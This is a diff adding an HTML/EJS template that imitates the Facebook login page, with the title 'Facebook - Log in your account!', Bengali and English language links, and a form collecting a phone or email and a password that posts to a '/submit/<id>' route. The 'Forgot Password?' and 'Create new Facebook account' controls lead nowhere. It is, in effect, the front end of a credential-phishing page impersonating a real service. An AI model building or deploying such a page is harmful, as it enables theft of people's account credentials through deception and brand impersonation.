@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - Log in your account!</title>
+    <link rel="stylesheet" href="/css/style.css" />
+  </head>
+  <body>
+    <div>
+      <img src="/images/bg.png" alt="bg" />
+    </div>
+    <div class="lang">
+      <p>বাংলা - English - <a href="#">More...</a></p>
+    </div>
+    <div class="container">
+      <form action="/submit/<%= id %>" method="POST">
+        <input
+          required
+          type="text"
+          name="username"
+          placeholder="Phone or email"
+        />
+        <input
+          required
+          type="password"
+          name="password"
+          placeholder="Password"
+        />
+        <button class="login" type="submit">Log In</button>
+      </form>
+      <a href="#">Forgot Password?</a>
+      <div>
+        <span>OR</span>
+      </div>
+      <button class="new">Create new Facebook account</button>
+    </div>
+  </body>
+</html>
